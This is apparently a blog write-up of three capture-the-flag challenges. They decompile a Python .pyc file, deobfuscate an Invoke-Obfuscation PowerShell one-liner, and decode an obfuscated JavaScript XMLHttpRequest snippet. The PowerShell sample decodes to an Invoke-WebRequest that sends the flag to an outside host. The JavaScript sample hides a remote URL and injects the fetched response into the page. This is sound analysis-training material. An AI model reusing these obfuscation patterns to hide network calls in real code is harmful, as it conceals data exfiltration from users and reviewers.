---
layout: post
title: "CTF7E4 - Programming Challenges"
categories: CTF7E4
---
## 1. c0mp1led
&nbsp;
**Challenge Description:**{: style="color: red"}
We recently received a .pyc file but we can't see the content inside it. Before we run it, could you please take a look and find out what's in it?
&nbsp;


> **→ unzip c0mp1led.zip**{: style="color: red"} 

```
Archive:  c0mp1led.zip
[c0mp1led.zip] c0mp1led.pyc password: 
  inflating: c0mp1led.pyc         
```

> **→ file c0mp1led.pyc**{: style="color: red"}

c0mp1led.pyc: data
&nbsp;

.pyc files are created by the Python interpreter when a .py file is imported. They contain the "compiled bytecode" of the imported module/program so that the "translation" from source code to bytecode (which only needs to be done once) can be skipped on subsequent imports if the .pyc is newer than the corresponding .py file, thus speeding startup a little. But it's still interpreted.
&nbsp;

With linux native binary **strings** we can view most of the strings that are present in a binary file. Lets use that to see if the flag is hardcoded.

> **→ strings -d c0mp1led.pyc**{: style="color: red"}

```
z;This function greets to
	the person passed in as
	parameter
Hello, 
. Good morning!N
print
name
c0mp1led.py
xor ctfc
zIThis function greets to
        the person passed in as
        parameterr
hello
584f527bZ
6433636f6d70316cZ
655f447d)
	bytearray
fromhex
decoder
functio
where is the flag?N)
<module>
```
&nbsp;

> **→ uncompyle6 c0mp1led.pyc**{: style="color: red"}

{% highlight python %}
# uncompyle6 version 3.6.0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.0 (default, Oct 23 2019, 18:51:26) 
# [GCC 9.2.0]
# Embedded file name: c0mp1led.py
# Size of source mod 2**32: 981 bytes


def hey(name):
    """This function greets to
        the person passed in as
        parameter"""
    print('Hello, ' + name + '. Good morning!')

hey('xor ctf')

def hello(name):
    """This function greets to
        the person passed in as
        parameter"""
    print('Hello, ' + name + '. Good morning!')

hello('xor ctf')

def fla():
    a = '584f527b'
    b = '6433636f6d70316c'
    c = '655f447d'
    z = bytearray.fromhex(a + b + c).decode()
    print(z)

def functio(name):
    """This function greets to
        the person passed in as
        parameter"""
    print('Hello, ' + name + '. Good morning!')

def n(name):
    """This function greets to
        the person passed in as
        parameter"""
    print('Hello, ' + name + '. Good morning!')

n('xor ctf')
print('where is the flag?')
# okay decompiling c0mp1led.pyc
{% endhighlight %}
&nbsp;

It seems that the flag hides in the **fla()** function. We can skip the rest of the code by calling only this function.
&nbsp;

> **→ cat flag.py**{: style="color: red"}
{% highlight python %}
def fla():
    a = '584f527b'
    b = '6433636f6d70316c'
    c = '655f447d'
    z = bytearray.fromhex(a + b + c).decode()
    print(z)
fla()
{% endhighlight %}

> **→ python flag.py**{: style="color: red"}

XOR{d3comp1le_D}

&nbsp;
&nbsp;
## 2. PS1
&nbsp;
**Challenge Description:**{: style="color: red"}
What file format is this **.ps1** and why it's so unreadable?
&nbsp;


> **→ unzip PS1.zip**{: style="color: red"} 

```
Archive:  PS1.zip
[PS1.zip] command.ps1 password: xor2020
  inflating: command.ps1           
```

> **→ ls**{: style="color: red"}

command.ps1  PS1.zip

> **→ cat command.ps1**{: style="color: red"}

{% highlight powershell %}
INVokE-ExPrEssiOn(((("{58}{33}{17}{4}{8}{41}{40}{43}{62}{42}{29}{3}{14}{35}{23}{7}{48}{38}{20}{76}{18}{63}{83}{84}{51}{72}{85}{88}{50}{6}{77}{59}{16}{57}{21}{52}{22}{61}{55}{69}{86}{64}{30}{71}{28}{46}{91}{5}{15}{27}{68}{90}{32}{60}{34}{67}{65}{74}{54}{79}{10}{75}{56}{26}{89}{1}{53}{37}{25}{81}{36}{12}{45}{0}{73}{47}{82}{39}{70}{13}{9}{11}{24}{87}{31}{19}{2}{49}{92}{66}{78}{44}{80}" -f 'TWqaSU','UT+SUT','l','+SUT','T','SU','+S','tS','Invo','l','SUTn','I','replACe  ','( 594ShEl','equSUT','T+SU','T+SUT','U','+S','L','+SU',':','lag.SUT+SUTxor.S','UTes','d[1]+','T}Wq','S','T{iSUT+S','UTXSUT','SUT','U','4shE','o','(S','_0bf','+S',' -C','T+SU','T','u','+SUTe-','kSUT','R','W','UT','SU','+SUT','3','U','iD[','UT','SUT+SUTt','//f','s1SU','Tti','+SUTal','UT+','s','(','SU','k3','UT','eb','UT WSUT','g=S','c4SUT+',']+','us','UTn','/?','t &','T+S','SUT+S','T,[chaR]','SU','S','T -UriSUT','UTp','S','oSUT+','xSUT)','aSUT) ','4)q','+SUTqSUT+SUT','ah','UT','fla','59','tS','UT.pS','v','OSUT+SUTR','13'))  -REpLacE'qut',[cHaR]124 -REpLacE ([cHaR]53+[cHaR]57+[cHaR]52),[cHaR]36-REpLacE  ([cHaR]83+[cHaR]85+[cHaR]84),[cHaR]39)
{% endhighlight %}
&nbsp;

As we can see it's obfuscated (shoutout to [Daniel Bohannon](https://github.com/danielbohannon/Invoke-Obfuscation)).
&nbsp;
We can manually deobfuscate it by rearranging the indexed chars, but to save some time we can use [PSDecode](https://github.com/R3MRUM/PSDecode). You can install this module both on Linux and Windows by copying it to your pwsh modules path.
> **→ Get-Content .\commands.ps1 \| PSDecode**{: style="color: red"}

Invoke-WebRequest -Uri "https://flag.xor.al/?flag=XOR{invok3_0bfusc4tion.ps1}"


&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/ps1.png){:.images}
&nbsp;


&nbsp;
&nbsp;


## 3. xhRReq
&nbsp;
**Challenge Description:**{: style="color: red"}
While doing our weekly scans on our website, we found this weird java script file but we don't understand nothing of it and developers don't remember to put it there.. Could you please tell us if this is harmful?
&nbsp;


> **→ unzip xhRReq.zip**{: style="color: red"} 

```
Archive:  xhRReq.zip
[xhRReq.zip] obfuscated.js password: xor2020
  inflating: obfuscated.js            
```

> **→ cat obfuscated.js**{: style="color: red"}

{% highlight html %}
<!DOCTYPE html>
<html>
<body>

<h2>Using the XMLHttpRequest Object</h2>

<div class="password">
<button type="button" onclick="myFunc() onerror=alert('xor2020')">Change Content</button>
</div>

<script>
var _cs=["\x64\x65","\x47\x45\x54","\x2f\x2f\x63","\x70\x73\x3a","\x2e\x63\x6f","\x6d\x2f\x31","\x37\x36\x61","\x38\x39\x65","\x6f\x6e","\x74\x72","\x6f\x6c\x63","\x6d\x6f","\x68\x74\x74",'\x66\x75\x6e\x63\x74\x69\x6f\x6e']; function _f0() { var _v0 = new XMLHttpRequest(); _v0.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(_cs[0]+_cs[11]).innerHTML = this.responseText; } }; _v0.open(_cs[1], _cs[12]+_cs[3]+_cs[2]+_cs[8]+_cs[9]+_cs[10]+_cs[4]+_cs[5]+_cs[7]+_cs[6]+"8", true); _v0.send(); }
</script>

</body>
</html>
{% endhighlight %}
&nbsp;

Even though it's obfuscated, from the challenge name and from the code structure we can see that it's a XMLHttpRequest. We're going to focus on **_v0.open()** function since it's used to make a request to a specific url.
&nbsp;

This function is using **_cs** variable and it's indexed chars. We are going to reorder these chars and decode them since they're hex encoded.
&nbsp;

```
_cs[1] = \x47\x45\x54
_cs[12] = \x68\x74\x74
_cs[3] = \x70\x73\x3a
_cs[2] = \x2f\x2f\x63
_cs[8] = \x6f\x6e
_cs[9] = \x74\x72
_cs[10] = \x6f\x6c\x63
_cs[4] = \x2e\x63\x6f
_cs[5] = \x6d\x2f\x31"
_cs[7] = \x38\x39\x65
_cs[6] = \x37\x36\x61
+ "8"
```
&nbsp;

> **→ echo '\x47\x45\x54' '\x68\x74\x74' '\x70\x73\x3a' '\x2f\x2f\x63' '\x6f\x6e' '\x74\x72' '\x6f\x6c\x63' '\x2e\x63\x6f' '\x6d\x2f\x31' '\x38\x39\x65' '\x37\x36\x61' '8'**{: style="color: red"}

GET htt ps: //c on tr olc .co m/1 89e 76a 8
&nbsp;

This page is password protected. If we look again at the html file we can see an alert that pops up on error with message 'xor2020'. Let's use this as a password and view the flag.
&nbsp;

```html
<button type="button" onclick="myFunc()" onerror=alert('xor2020')">Change Content</button>
```

&nbsp;
![filtered1]({{ site.baseurl }}/assets/images/ctf7e4/xhrreq.png){:.images}
&nbsp;


&nbsp;
I hope you had fun solving these challenges and learning something new.